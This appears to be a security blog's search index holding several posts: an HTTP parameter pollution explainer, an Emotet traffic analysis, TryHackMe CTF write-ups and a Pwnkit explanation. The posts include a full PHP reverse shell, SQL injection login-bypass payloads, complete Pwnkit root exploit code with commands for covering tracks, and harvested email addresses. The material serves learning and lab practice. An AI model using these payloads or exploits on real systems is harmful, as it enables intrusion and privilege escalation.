[
  
  {
    "title": "HTTP Parameter Pollution Explained",
    "url": "/posts/What-Is-HTTP-Paramter-Pollution/",
    "categories": "Cybersecurity",
    "tags": "Web-Attacks",
    "date": "2022-02-28 00:00:00 +0800",
    





    "snippet": "HTTP Parameter Pollution (HPP) is a method where an attacker uses multiple parameters with the same name to make the server respond and behave unexpectedly.How it WorksHPP was discovered and presented in 2009 in which the security community then thought of it as a new method of being able to bypass web application firewalls. This vulnerability exists because there is no standard to how a web server should handle parameters with the same names. Without a standard, web application components handle HPP in a variety of ways. The chances of finding HPP is common as it is part of “Insecure Design” in the OWASP 2021 Top 10 Vulnerabilities.So let’s say you have the URL query of http://example.test/?color=redThen you would add another color parameter with the blue value and the url becomes: http://example.test/?color=red&amp;amp;color=blueThis is HPP and as I’ve said, which parameter value (or color) would be accepted varies. The following table is a list of some backend server setups and which parameter they would accept.Source: OWASP 2009 EU ConferenceIt is important to note that HPP isn’t a vulnerability itself, but it can be abused if developers aren’t aware of it. Wether or not HPP is a vulnerability depends on the configuration and code of the web application. HPP can essentially be used to:  Bypass security control mechanisms such as authentication  Bypass filters (e.g. the web application firewall)  Modify internal values  Chain other web attacks such as SQL, XSS, IDOR, or even RCE  Change the application flowYouTube ExampleThe URL format of a YouTube video would typically be:https://youtube.com/watch?v=[video ID parameter value here]The video ID parameter value of Rick Astley’s Never Gonna Give you Up music video is dQw4w9WgXcQ and the video ID parameter of a funny video that I like is nNZeiK1Z6ocThe following four links has 4 video ID parameters. Which parameter placement do you think YouTube will accept to play the funny video?Option 1 - last parameter:https://youtube.com/watch?v=dQw4w9WgXcQ&amp;amp;v=dQw4w9WgXcQ&amp;amp;v=dQw4w9WgXcQ&amp;amp;v=nNZeiK1Z6ocOption 2 - third parameter:https://youtube.com/watch?v=dQw4w9WgXcQ&amp;amp;v=dQw4w9WgXcQ&amp;amp;v=nNZeiK1Z6oc&amp;amp;v=dQw4w9WgXcQOption 3 - second parameter:https://youtube.com/watch?v=dQw4w9WgXcQ&amp;amp;v=nNZeiK1Z6oc&amp;amp;v=dQw4w9WgXcQ&amp;amp;v=dQw4w9WgXcQOption 4 - first parameter:https://youtube.com/watch?v=nNZeiK1Z6oc&amp;amp;v=dQw4w9WgXcQ&amp;amp;v=dQw4w9WgXcQ&amp;amp;v=dQw4w9WgXcQStealing From Banks with HPP and Real Life ExamplesLet’s say there’s a bank that has an online website and the URL https://bank.url/ with the server running Apache and PHP. The website has the function to send and receive money from other people. When that happens, the following URL is sent:https://bank.url/?from=attacker&amp;amp;to=alice&amp;amp;amount=100To prevent tampering with the from parameter, the site looks at the user’s cookie for validation so changing the value of the from parameter to alice or any other user will invalidate the transaction.If the website developers of the bank aren’t aware of HPP, the attacker can create a URL that will make Alice send money to the attacker. The URL would look like this:https://bank.url/?from=attacker&amp;amp;to=alice&amp;amp;from=alice&amp;amp;to=attacker&amp;amp;amount=100The above URL makes it so the first from and to parameters are ignored and the last two are accepted and alice sends 100 dollars to attacker.The following are examples of HPP in real life.  Bypassing authentication on Twitter ($2,520 USD)  Bypassing Google’s reCAPTCHA ($500 USD)  Twitter account takeover (Undisclosed Bug Report)  Deleting all user messages in Yahoo! Classic MailTesting and ExploitationTesting can be a pain especially when the web server would use dozens of parameters or requests. Using an HTTP proxy such as ZAP or Burp Suite can help make things easier by identifying all the parameters used in the website. Keep in mind that parameters can appear in both HTTP GET and POST requests.For best results, testing HPP should be done manually. While programs can be created to automate the test, many false positives could be generated.If a WAF is in place, HPP can help you bypass it and send your payload to execute attacks such as SQLI and XSS.Mitigation  Set the application to accept parameters when and where they’re expected  Implement proper input validation and sanitation on all user-supplied data          URL encode user input before embedding input in a URL        Configure the WAF to not accept a request containing multiple parameters with the same nameReferences      PwnFunction - HTTP Parameter Pollution Explained        https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution        https://macrosec.tech/index.php/2021/05/24/http-parameter-pollution-hpp/        https://blog.intigriti.com/hackademy/http-parameter-pollution/  "
  },
  
  {
    "title": "Network Analysis of Emotet Malware Activity Using Wireshark",
    "url": "/posts/emotet_network_analysis/",
    "categories": "Cybersecurity",
    "tags": "Network-Analysis",
    "date": "2022-02-19 00:00:00 +0800",
    





    "snippet": "IntroductionIn this post I will be showing you how I analyzed emotet malware in a network log using Wireshark and hopefully this will help you give an idea of what to do and look for when analyzing a network log using Wireshark.While searching for pcap files to analyze, I came across the site https://www.malware-traffic-analysis.net/. It is a site that collects network logs from malware so it is good if you’re also looking to practice network analysis and malware analysis. For this post, I will be analysing a pcap file of Emotet actvity on a network.Brief History of EmotetFirst discovered in 2014, Emotet began as a banking trojan and then evolved into a more sophisticated trojan that would act as a downloader for other malware. Emotet is known by many cybercriminals as the operators of the malware would partner with other cybercriminals and work to distribute various malware globally such as ransomware or to even sell access to data thieves. Dutch police estimated that Emotet has caused hundreds of millions of dollars in damages while the Ukranian police has made an estimate to around 2.5 billion USD in damages.Emotet spreads mainly through spam email containing malicious links and documents with tainted Microsoft Office macros. The operators are skilled in spam filter evasion and would use compromised email servers to send mass emails and spread in a organization’s network to gain control of more machines.In January of 2021, a coalition of law enforcement agencies in Europe along with the US, Canada, and private security researchers under Europol announced a raid that had disrupted Emotet and arrested at least two members. The raid had included the seizure of back up drives making law enforcement hopeful that this would prevent Emotet from coming back. Unfortuantely, it became apperant that the raid was only a minor set back and in December of 2021, there was a huge spike in Emotet activity.If you’re interested, you can watch a video of the raid here (YouTube - Ukraninan).Using Wireshark to Examine Emotet Network ActivityBefore we begin, a word of warning. Don’t visit any of the links and be very careful if you’re following along and using Windows because the malware is Windows based.So the first thing we can do is check HTTP since it is always an interesting protocol to look at because the web traffic that passes through that port is unencrypted.Here we have two interesting results. The first is HTTP traffic from device DESKTOP-PZKSV1P.local (10.1.11.101) to the website petparaise[.]biz. The second is HTTP traffic from the site mm24-231.static.goplex.com[.]br from port 80 to port 62,731 in the local machine.Let’s first look at the first result and make a filter between the compromised machine and petparadize[.]biz. We can find the IP of petparadise, by looking at the lower section with the Internet Protocol Version 4 tab and then use it to create a filter.If we look at the info of the first packet, we see an interesting parameter name= with the value of a name. In the fourth packet, we can see that a file was sent and downloaded to the desktop device. Now let’s take a closer look and the actual data of the conversation. With the filter in place we right click on the first packet, then select the options Follow &amp;gt; HTTP Stream to follow the HTTP traffic stream of the first packet. Now we see that the client has made a request and the server responded but there’s something wrong. In this converstaion, we only see 1 client request and 1 server response. However in our filter, we saw that there were 2 requests and 2 responses. So there are two seperate conversations.Now let’s go back and check the second conversation. We’ll follow the 2nd conversation using the same method we did in the first conversation and follow the stream. Here we can see that a request was made to the same server using the URL of the first request as the refferer. The server then responded with a file that had the .xls extension which is commonly used for Microsoft Excel files.Because both streams communicated using HTTP without encryption, we can see the details of the conversations. With Wireshark, we can also extract the data of the web page and the Microsoft excel file. To do this, we’ll go to the “File” tab in the toolbar, select Export Objects, then you’ll be given a list of downloadable HTTP objects.We’re only looking for the HTTP objects from petparadise, so select those two and then save them individually. When we try to save them, we see that the files try to save as the URL’s component. However we’re going to rename the files. The file “%3fname=Jeremiah%20…” which has the content type “text/html” will be renamed to “web_page.html”. The .html extension helps our browser to recognize it as an HTML file. The next HTTP object with the URL component “%3fi=1” and the content type “application/vnd.ms-excel” will be renamed to “22640661385087646K.xls”.Using Firefox in offline mode, we can safely view the HTML file of the website that was visited by the user Jeremiah.For the excel file, we can then either do a malware analysis of the file or upload it to a site such as VirusTotal and see if it is a known malicious file.As we see from the result of our upload, the file was reported 19 days ago and is known to be malicious. For more information about the file, we can click on the other tabs for more information.Now we know how the machine was compromised, but what happened after they clicked on the malware? Let’s just take a look at the second HTTP stream since it came after visiting petparadise.When we look here, all we see is gibberish. Even though the traffic goes through port 80 from the site. This is unusual as traffic using HTTP can be viewed. So what we can assume here is that the gibberish that we’re seeing is encrypted traffic. Unfortunately, we don’t have the necessary secrets which is either a key log file or an RSA private key to decrypt the traffic. It’s an interesting connection, but we have to move on. Without access and cooperation from either the client or server, we can’t decrypt the traffic. Same goes for all the other traffic that communicated over port 443 using TLS.What we can do next however is use Wireshark’s Endpoints feature under the statistics tab to look at what other protocols we can look at. Before we do it, we also want use the display filter ip.addr==10.1.11.101 to see only the protocols used by that device.Looking at the protocol hierarchy statistics, we can see that device 10.1.11.101 has also used SMTP. Which is another protocol that we can look at.From here we can apply a filter smtp.req.parameter contains “FROM” to show SMTP traffic with the “MAIL FROM” command. Using this filter will allow us to see all of the email addresses used to send the spam email.We could then export our results by going to “File” and then “Export Packet Dissections”. From the text file we can see information such as the time, destination of the email, and what email address was used. We could then use a script to search and remove all of the information except the email addresses to get the list of addresses used in the email spamming.Rather than look at each email and conversation one by one, we can also export all these emails same way as we did for the HTTP web page and excel file. This time we just need to select “IMF” after hovering over the option “Export Objects”.We could then use an email client such as Thunderbird to view all of the email files. The following photos are from a couple of the emails extracted.So what did we learn?  User Jeremiah was the one to have clicked on the phishing email  Website http://petparadize[.]biz (66.49.200.140) was the site that delivered malware using a malicious XLS file  Device DESKTOP-PZKSV1P.local (10.1.11.101) was compromised and used as a spambot to send phishing emails  Email addresses used by the spambot:          aon.913289727@aon.at      monika.wagner1961@a1.net      ff.aktuell@aon.at      a1.914425380@a1.net      xjli@grandlogistics.com.cn      uwe.neuhoff@ewetel.net      masha@a2000.ru      retha@ifswealth.co.za      yokoyama@g-fac.jp      aon.914694487@aon.at      marie.recke@mnet-mail.de      inzekon2@konin.lm.pl      manoj.kumhar@opporajasthan.in        Interesting encrypted traffic to and from compromised device:          mm25-231.static.goplex.com[.]br 	(131.100.24.231)      References      https://www.wired.com/story/emotet-botnet-takedown/        https://blog.malwarebytes.com/trojans/2021/12/emotets-back-and-it-isnt-wasting-any-time/  "
  },
  
  {
    "title": "TryHackMe Plotted-TMS Writeup",
    "url": "/posts/THM-plotted-tms-writeup/",
    "categories": "Writeups",
    "tags": "SQLi, CTF, TryHackMe, Web-Attacks",
    "date": "2022-02-19 00:00:00 +0800",
    





    "snippet": "IntroductionPlotted-TMS is a easy level THM room created by sa.infinity8888.ReconStarting with 2 nmap scans, we see that there are 2 services running - SSH and Apache on port 80 and 445.Visiting both sites leads to a default Apache page so it’s back to recon.Running ffuf on port 80 shows a couple interesting directories.We then see a possible SSH key but it is revealed that the contents are just a red herring.I assumed that all the other directories are red herrings so I skipped to enumerating on port 445.I then found what looks to be the intended website with the CMS in use being “Traffic Offense Management System”.A search of the CMS site reveals that the site could be vulnerable to SQLi and RCE.Exploitation - SQLi to RCEThe script is written in python3 so you can try to run that though it gave me an error and I couldn’t get it to work I did it manually.Using the payload admin&#39; or &#39;1&#39;=&#39;1&#39;# would allow us to bypass the login page.On the “Drivers List” on the left of the site, there is a function where we can create an offense record entry with the driver’s information. What’s notable about it is that there is an upload function.We can abuse that function to upload a shell and create a reverse connection. Click on “Drivers List” then “Create New” to add an entry, enter fake information for required input fields then upload your shell as the profile picture.Click on the eye icon under name to view the entry you just made which would make a request for the profile picture or shell that you uploaded.Privilege Escalation - www-data to plot_adminNow that we’ve achieved RCE, it’s time to enumerate more and see if we can break into any other user accounts. Looking in the /home/ directory there are the users ubuntu and plot_admin. Using the find command, we can see see that user plot_admin is running a backup script.A further look reveals that the script is owned by plot_admin and that it is run every minute as a cronjob.While we don’t have permissions to write to the script, we have permissions to write on the directory /var/www/scripts which is where the script is. This means that we can write our own script that will replace the one being run and have it executed by cron the next minute.Using bash (GTFO BINS), we can create a reverse shell connection as the user plot_admin.Privilege Escalation - plot_admin to rootOnce the reverse shell is created and we are now able to use the plot_admin account, we can check the user’s sudo privileges. Although this will return the error a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper so we need to upgrade our shell with:python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;We are then able to execute sudo and check plot_admin’s privileges but then it asks for a password? Looks like it’s back to recon.Using the find command, I see that there’s a new SUID program that I have never seen before, doas.A lookup onto what the program is reveals that it is an alternative lightweight program to sudo. To see what programs user plot_admin can run doas as root without a password, we would need to read the file /etc/doas.conf which should only be readable by the owner but it is not.So plot_admin can use openssl as root without a password. We can then consult GTFO bins on openssl and either read root.txt or create a reverse shell with root privileges. I used openssl to just do a file read on the root.txt file.References  https://rs1.es/tutorials/2022/01/11/doas.html"
  },
  
  {
    "title": "TryHackMe h4cked Writeup",
    "url": "/posts/THM-h4cked-Writeup/",
    "categories": "Writeups",
    "tags": "Network-Analysis, CTF, TryHackMe",
    "date": "2022-02-19 00:00:00 +0800",
    





    "snippet": "h4cked is an easy CTF room that exercises your skills in network analysis.Network Analysis Using WiresharkThe story behind this room is that a machine got compromised and now we must examine a .pcap file to find out what happened. The first question asks us what service the attacker is trying to log into.A quick skim of the log shows that there is a lot of traffic going into the FTP service and that the attacker is trying to login as the user “jenny”.The attacker is trying to log into a specific service. What service is this?&amp;gt; FTPThe attacker is trying to log on with a specific username. What is the username?&amp;gt; jennyThe second question asks what is a popular tool created by Van Hauser that can be used to brute force a lot of services. A quick Google search would immediately show what the name of the tool is.There is a very popular tool by Van Hauser which can be used to brute force a series of services. What is the name of this tool?&amp;gt; HydraThe next thing we need to find is what was user Jenny’s password that the attacker found out. Because the log file is small, you can easily skim and find what passord it was if you filter by the FTP protocol. However you can also use the filter “ftp.request.command==USER || ftp.request.command==PASS” to show all of the attempted login attempts.The photo also shows the output of the pwd command the attacker executed after being logged in.What is the current FTP working directory after the attacker logged in?&amp;gt; /var/www/htmlThe next question asks what is the name of the backdoor file that was uploaded by the attacker. To find the file, we right click any of the packets sent during the successful FTP login, then select follow, and then “TCP Stream”.The attacker uploaded a backdoor. What is the backdoor’s filename?&amp;gt; shell.phpNow we need to find out where the shell can be downloaded. For this, we need to look at the data inside the PHP file. We can use the filter “ftp-data” to find the shell. Then like with what we just did earlier, right click the packet, select follow, and then “TCP Stream”.The backdoor can be downloaded form a specific URL, as it is located inside the uploaded file. What is the full URL?&amp;gt; http://pentestmonkey.net/tools/php-reverse-shellNext we need to find the series of commands the attacker executed while using the reverse shell. The filter that we need to apply is “http” or “tcp.port==80”.If we try to follow the first packet in the results, we’d see the HTTP request made for the reverse shell. What we’ll do is select the “Filter Out This Stream” option on the bottom of the second window so that we can follow the stream of the commands the attacker sent in the reverse shell session.Which command did the attacker manually execute after getting a reverse shell?&amp;gt; whoamiIf the look through the log, we can see all of the activity that the attacker did on the machine.What is the computer’s hostname?&amp;gt; wir3Which command did the attacker execute to spawn a new TTY shell?&amp;gt; python3 -c ‘import pty; pty.spawn(”\\/bin\\/bash”)’Which command was executed to gain a root shell?&amp;gt; sudo suThe attacker downloaded something from GitHub. What is the name of the GitHub project?&amp;gt; ReptileThe last question would require a little research if you don’t already know.The project can be used to install a stealthy backdoor on the system. It can be very hard to detect. What is this type of backdoor called?&amp;gt; RootkitExploitation - Weak Password &amp;amp; RCENow that we know what happened, we are to repeat the same steps gaining access to the machine, become root and then reading the flag. So let’s get Hydra started.Note: the ftp username is case sensitive, so be sure to use a lowercase “j”.After you placed your shell onto the machine, make it executable and then you can visit the link to your shell to execute it.As you can see, we’ve achieved RCE but we receive an error when trying to switch our user account to jenny. To resolve this error, we follow what happened in the initial attack of the attacker and execute python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;Privilege EscalationFrom here it’s a straight path to the finish line. If we check jenny’s privileges with sudo -l we see that she still has complete sudo privileges so we just need to become sudo and then read the flag.txt file rather than use the Reptile rootkit."
  },
  
  {
    "title": "TryHackMe Gallery Writeup",
    "url": "/posts/THM-Gallery-Writeup/",
    "categories": "Writeups",
    "tags": "SQLi, CTF",
    "date": "2022-02-14 00:42:00 +0800",
    





    "snippet": "The THM room Gallery is an easy level CTF room created to test your skills in SQLi and exploiting known vulnerabilities.ReconStart with a simple port scan.Here we can see that there are two ports open on the system. So the answer to the first question in task 1 is 2. If we were to then visit the website, we would be shown a default page for Apache2 in Ubuntu. However, if we were to visit the website on port 8080, we would be redirected to a login page.The title above the login is “Simple Image Gallery System” which is a CMS used by the website and the answer to question 2 on task 1. Now let’s look for exploits that we can use.On Exploit-DB, there are two notable vulnerabilities: an unauthenticated RCE and a SQLi. I did the RCE first, but because the next question asks what’s the admin user’s hash, we’ll first do the SQLi.Exploitation - SQLiThe POC has 5 steps to exploiting the vulnerable “id” parameter with SQLi:  Login to an account  Click on the Albums page and select any album/create a new album  Click on an image, capture the request burpsuite/ZAP, then export the raw request header into a file  Run sqlmap with the command sqlmap -r [FILENAME] --dbs  At this point, the database names would be disclosedStarting with step 1, we need a valid user account. So how do we get get one? By using SQLi of course. If we go back and test the login page, we’d see that we can bypass it using SQLi. Entering a ‘ into the username would create the HTTP POST response:{&quot;status&quot;:&quot;incorrect&quot;,&quot;last_qry&quot;:&quot;SELECT * from users where username = &#39;&#39;&#39; and password = md5(&#39;&#39;) &quot;}With the right payload, we can bypass authentication. For me, I used:  admin&#39; or &#39;1&#39;=&#39;1&#39;#The login page for me was a little bugged. I had to reload, duplicate the login page, and repeatedly enter the SQLi payload because the page would just hang with the reloading animation but if you keep doing it, it’ll eventually get through.Afterwards, follow steps 2 to 4 of the POC. When you run sqlmap, you will then be prompted to answer a series of questions. Just answer yes for the first 3 questions and then no to the fourth and final question.Now that we have the database name, we could dump all of it’s contents with the next command:sqlmap -r gallery.raw -D gallery_db --dumpYou will again be prompted to answer a few questions, to which you can just answer no to. Afterwards, you will then have the hash for the admin password and the answer to question 3 on task 1.I wasn’t able to crack the hash using online hash crackers or JTR. So now we move on to the next vulnerability.Exploitation - RCEThe way the RCE exploit works is that it abuses the SQLi vulnerability to bypass login and then uploads a PHP shell. To use this, we need to simply copy and paste the script onto our machine and then execute it with python3. We will be prompted for the target URL which is the path to the login page.Copy the URL and visit the link and we’ll be see the output of the whoami command.The cmd parameter is used to execute commands. However it isn’t good enough because we’d need to URL encode every command we execute if we want to use something like space. So it would be better to use the RCE to create a reverse shell. We can do it in two ways. One is to create a URL encoded command that will send a connection to our machine. The second is to use a one line PHP shell as the payload string value in the RCE python script. I did the latter as I already had a PHP one line shell.&amp;lt;?php set_time_limit (0); $VERSION = &quot;1.0&quot;; $ip = &quot;KALI&quot;; $port = 443; $chunk_size = 1400; $write_a = null; $error_a = null; $shell = &quot;uname -a; w; id; /bin/bash -i&quot;; $daemon = 0; $debug = 0; if (function_exists(&quot;pcntl_fork&quot;)) { $pid = pcntl_fork(); if ($pid == -1) { printit(&quot;ERROR: Cannot fork&quot;); exit(1); } if ($pid) { exit(0); } if (posix_setsid() == -1) { printit(&quot;Error: Cannot setsid()&quot;); exit(1); } $daemon = 1; } else { printit(&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;); } chdir(&quot;/&quot;); umask(0); $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) { printit(&quot;$errstr ($errno)&quot;); exit(1); } $descriptorspec = array(0 =&amp;gt; array(&quot;pipe&quot;, &quot;r&quot;), 1 =&amp;gt; array(&quot;pipe&quot;, &quot;w&quot;), 2 =&amp;gt; array(&quot;pipe&quot;, &quot;w&quot;)); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) { printit(&quot;ERROR: Cannot spawn shell&quot;); exit(1); } stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); printit(&quot;Successfully opened reverse shell to $ip:$port&quot;); while (1) { if (feof($sock)) { printit(&quot;ERROR: Shell connection terminated&quot;); break; } if (feof($pipes[1])) { printit(&quot;ERROR: Shell process terminated&quot;); break; } $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); if (in_array($sock, $read_a)) { if ($debug) printit(&quot;SOCK READ&quot;); $input = fread($sock, $chunk_size); if ($debug) printit(&quot;SOCK: $input&quot;); fwrite($pipes[0], $input); } if (in_array($pipes[1], $read_a)) { if ($debug) printit(&quot;STDOUT READ&quot;); $input = fread($pipes[1], $chunk_size); if ($debug) printit(&quot;STDOUT: $input&quot;); fwrite($sock, $input); } if (in_array($pipes[2], $read_a)) { if ($debug) printit(&quot;STDERR READ&quot;); $input = fread($pipes[2], $chunk_size); if ($debug) printit(&quot;STDERR: $input&quot;); fwrite($sock, $input); } } fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); function printit ($string) {  if (!$daemon) { print &quot;$string\\n&quot;; } } ?&amp;gt;See where it says “KALI” and “443” in the beginning? Change those to your corresponding IP and desired port number. The shell also uses double quotation marks so be sure to wrap it into single quotation marks to make it a valid string value for payload in the Python script. Setup netcat, execute the script, copy and visit the link and now you have a reverse shell.Privilege Escalation - www-data to mikeWith a little recon, we can see that user Mike has a backups folder.The documents directory contains the file accounts.txt with alleged accounts to Spotify, Netflix, and TryHackMe. However those are all red herrings. The real thing we’re looking for is in Mike’s bash command history. It seems Mike has made a mistake and entered his password as he was checking his sudo privileges.Now we got Mike’s password and can change to his account using su. However that would just lead to the following error being returned to us: su: must be run from a terminal. This error was returned to us because we need to make our shell more interactive. We can do this with Python3 and the command: python3 -c &#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;.Login using su into Mike’s account, then you can read user.txt in his directory.Privilege Escalation - mike to rootIf we check Mike’s sudo privileges, we see that he can run a certain script with sudo.What’s notable here in this script is that it uses nano when we select the read option. When nano is used by sudo, we can abuse it to execute commands with root privileges (nano on GTFO bins).If we try to execute nano using the script, we encounter another error: Error opening terminal: unknown. This occurs because our TERM environment variable isn&#39;t set. Executing echo $TERM would return the output “dumb”. We need to change it so we’ll set it to the value linux with the command: export TERM=linuxNow we can execute nano. But it’s small and not taking the whole screen? Well then ctrl++ and now it’s bigger!According to GTFO bins, using nano and then pressing ctrl+r and then ctrl+x would bring a prompt to execute commands. However that wouldn’t work because once again, we need to tinker our reverse shell and stabilize it.We just need to do two things. Background our shell by pressing ctrl+z and then execute stty raw \\-echo &amp;amp;&amp;amp; fgThis will stabilize the shell, but also make the terminal more laggy. Though we’re almost done because now you can either follow GTFO bins and spawn a shell with root privileges using reset; sh 1&amp;gt;&amp;amp;0 2&amp;gt;&amp;amp;0 or just cat /root/root.txt and then you’ll have the root flag.References      How to upgrade shells to be interactive by ropnop: https://jasonturley.xyz/how-to-stabilize-a-reverse-shell/        How to stabilize a reverse shell by Jason Turley: https://jasonturley.xyz/how-to-stabilize-a-reverse-shell/  "
  },
  
  {
    "title": "Explanation of CVE-2021-4034 a.k.a. Pwnkit",
    "url": "/posts/CVE-2021-4034-a.k.a.-Pwnkit-Explanation/",
    "categories": "Cybersecurity",
    "tags": "Linux, Vulnerabilities, Privilege-Escalation",
    "date": "2022-02-07 00:00:00 +0800",
    





    "snippet": "On January 25, 2022, security researchers at Qualys labs disclosed a Local Privilege Escalation vulnerability in Linux within Polkit’s pkexec component. Listed as CVE-2021-4034 and given a high severity rating of 7.8 out of 10 on the CVSS scale, this vulnerability affects many Linux distributions including Ubuntu, Debian, Fedora, and CentOS. A proof of concept (POC) wasn’t submitted by Qualys along with their disclosure, but amazingly people started to create and upload their own POCs just hours of the announcement. At the time, I myself saw some POCs being uploaded to Github.What is Polkit and pkexec?Polkit is a program used in Linux to handle authorisation policies and determine if you have proper permissions. Pkexec, which is a component of Polkit, is a SUID-root program that allows one to execute commands as another user. If no user is specified, then Pkexec will use the root user as the default.In other words, the policy toolkit is like an alternative to the sudo command that most Linux users are familiar with. If you were to run a command such as pkexec whoami, you would be prompted for a password and then when entered, the output of the command would be “root”.How it WorksDirector of Vulnerability and Threat Research at Qualys, Bharat Jogi, explains PwnKit as “a memory corruption vulnerability in Polkit, which allows any unprivileged user to gain full root privileges on a vulnerable system using default polkit configuration”.While the vulnerability won’t give initial system access to an attacker, it’s still a significant vulnerablity for a couple of reasons:  The vulnerability would give an attacker full control of a Linux system  It has existed for 12 years ever since Policy Kit’s first release in 2009 and so any unpatched Linux systems in that timeline is vulnerable  It is easy to exploitThe reason to why pkexec was vulnerable is because it mishandles command line arguments. In Linux C Programs, the first argument would be assigned to the name of the executable itself. However it is also possible to specify an empty list without the executable name and using the execve function to call the executable. In this case, the program would rely that the first argument to call the executable name which can lead to memory corruption vulnerabilities. What makes pkexec special is that it is SUID and has special file permissions that allow it to run as the original owner which is root. What pwnkit does is list no arguments to pkexec resulting in corrupted memory and allowing an attacker to obtain root privileges.For a more detailed and technical explanation, see Qualys’ blog post.ExploitationWith just two small files and a couple of Linux commands, an attacker can exploit the vulnerability within a minute.The first file we need is called evil-so.c which contains the code:#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;void gconv() {}void gconv_init() {    setuid(0);    setgid(0);    setgroups(0);    execve(&quot;/bin/sh&quot;, NULL, NULL);}The second file we need is called exploit.c which has the contents:#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#define BIN &quot;/usr/bin/pkexec&quot;#define DIR &quot;evildir&quot;#define EVILSO &quot;evil&quot;int main(){    char *envp[] = {        DIR,        &quot;PATH=GCONV_PATH=.&quot;,        &quot;SHELL=ryaagard&quot;,        &quot;CHARSET=ryaagard&quot;,        NULL    };    char *argv[] = { NULL };    system(&quot;mkdir GCONV_PATH=.&quot;);    system(&quot;touch GCONV_PATH=./&quot; DIR &quot; &amp;amp;&amp;amp; chmod 777 GCONV_PATH=./&quot; DIR);    system(&quot;mkdir &quot; DIR);    system(&quot;echo &#39;module\\tINTERNAL\\t\\t\\tryaagard//\\t\\t\\t&quot; EVILSO &quot;\\t\\t\\t2&#39; &amp;gt; &quot; DIR &quot;/gconv-modules&quot;);    system(&quot;cp &quot; EVILSO &quot;.so &quot; DIR);    execve(BIN, argv, envp);    return 0;}To get these files onto the system, you can either copy and paste them into the target system into 2 different files with their respective names, use SCP if SSH is enabled, or use curl/wget to download the files online anywhere.After you have the files on the system, execute the commands: gcc -shared -o evil.so -fPIC evil-so.c and then execute gcc again with gcc exploit.c -o exploit command. You can cover some of your tracks with rm -r ./GCONV_PATH=. &amp;amp;&amp;amp; rm -r ./evildir &amp;amp;&amp;amp; rm exploit &amp;amp;&amp;amp; rm evil.so or you can just execute the program with ./exploit and then obtain root privilege.If you’re looking to try and exploit the vulnerability, TryHackMe has released a room in which you can play around with.Solutions and MitigationsAt the same time the vulnerability was disclosed, an update has been released for all Linux systems to patch the vulnerability. On Ubuntu and Debian systems, an update can be applied using apt with the sudo apt update &amp;amp;&amp;amp; sudo apt upgrade -y command. If for whatever reason, you can’t patch your system, Qualys recommends removing the SUID-bit from pkexec as a temporary mitigation. The command for that would be sudo chmod 0755 /usr/bin/pkexec.If you think your system has been affected by the vulnerability, look at your logs and look for entries within the lines of “The value for the SHELL variable was not found the /etc/shells file” or “The value for environment variable […] contains suspicious content.” Unfortunately however there are many variations of Pwnkit in which some uses different environment variables and exploits the vulnerability in different ways. This means that some exploits will leave traces and be detected by logs and some will not.Referenceshttps://www.bleepingcomputer.com/news/security/linux-system-service-bug-gives-root-on-all-major-distros-exploit-released/https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txthttps://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4034https://nvd.nist.gov/vuln/detail/CVE-2021-4034https://www.exploit-db.com/exploits/50689https://www.schneier.com/blog/archives/2022/01/twelve-year-old-linux-vulnerability-discovered-and-patched.html"
  },
  
  {
    "title": "How to Hack your Ex-girlfriend&#39;s Instagram Account",
    "url": "/posts/How-to-Hack-Your-Ex-Girlfriend's-Instagram-Account/",
    "categories": "Uncategorized",
    "tags": "",
    "date": "2022-01-27 00:00:00 +0800",
    





    "snippet": "Scenario: You’ve recently broke up with your ex and has blocked you on all social media including Instagram. Now you’re looking for a way to break into her IG account and get back at her.Well you won’t find the way to do it here. (͡° ͜ʖ ͡°)"
  },
  
  {
    "title": "THM Library Walkthrough",
    "url": "/posts/THM-Library-Walkthrough/",
    "categories": "Writeups",
    "tags": "TryHackMe, CTF, Network-Attacks",
    "date": "2022-01-18 00:00:00 +0800",
    





    "snippet": "The THM library room is a room created to practice SSH network service brute forcing and Python library hijacking.EnumerationA little after booting the machine, I start with a nmap scan.In less than 6 seconds, I see that there are only two ports available. Using the OWASP ZAP, I visited the website.On the website we don’t see much, however we do see the username “meliodas” and 3 other usernames. Which I assumed to also be a username on the system.Walking around the website, there is very little. Even the hyperlinks on the navigation bar didn’t lead to any new webpages, so I went back to enumerating more.Using the automated scan feature on ZAP, I found the robots.txt to have something interesting.The robots.txt on the site contained “rockyou” which is a very popular password cracking wordlist.ExploitationWith the little hint in robots.txt, I suspected that the user meliodas had weak credentials. Using hydra, I began to brute force the machine’s SSH service.After the valid credentials were found, I logged in, checked sudo privileges and then read the user.txt file.Privilege EscalationAfter entering the contents of user.txt into the answer bar, I started to look at bak.py to see if I could abuse the script to obtain root privilege. The script isn’t writable, but it is executable.Looking at the script, I see that the os and zipfile libraries are being used. After some research, I learned that I can escalate privileges by hijacking any of the two libraries that are being used in the python script.Using a malicious zipfile.py, I then copied it unto the machine using nano. Although you can also use scp.By executing bak.py, python will first look into the same directory as the script to see if there are any custom libraries that could be recalled. If a custom library is in the same directory as the script, the custom library will be prioritzed and called first rather than where the default libraries of Python are located.This trick has been patched however and now Python will call libraries from the default location before calling libraries on the same directory as the script. For this reason, it’s note likely to happen on the real world, but could still happen when doing CTFs on older machines.Once I executed the script and received a connection on netcat, I then read the root.txt file."
  },
  
  {
    "title": "THM Anonforce Writeup",
    "url": "/posts/THM-Anonforce-Writeup/",
    "categories": "Writeups",
    "tags": "TryHackMe, CTF",
    "date": "2022-01-17 00:00:00 +0800",
    





